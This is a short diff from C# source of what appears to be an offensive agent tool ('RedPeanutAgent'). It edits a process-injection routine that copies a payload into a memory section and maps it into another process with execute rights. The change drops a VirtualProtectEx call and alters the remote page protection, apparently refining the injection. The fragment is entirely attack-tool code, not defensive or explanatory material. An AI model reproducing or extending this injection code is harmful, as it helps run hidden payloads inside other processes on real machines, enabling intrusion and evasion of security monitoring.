@@ -221,12 +221,10 @@ namespace RedPeanutAgent.Execution
             //Copy payload to current process section
             Marshal.Copy(payload, 0, baseAddr, payload.Length);
 
-            Core.Natives.VirtualProtectEx(Core.Natives.GetCurrentProcess(), baseAddr, viewSize, Core.Natives.PAGE_EXECUTE_READ, out uint oldprotect);
-
             //Map remote section
             IntPtr baseAddrEx = IntPtr.Zero;
             IntPtr viewSizeEx = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Core.Natives.PAGE_EXECUTE_READ);
+            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Core.Natives.PAGE_EXECUTE);
             if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
             {
                 Console.WriteLine("Error mapping section remote");
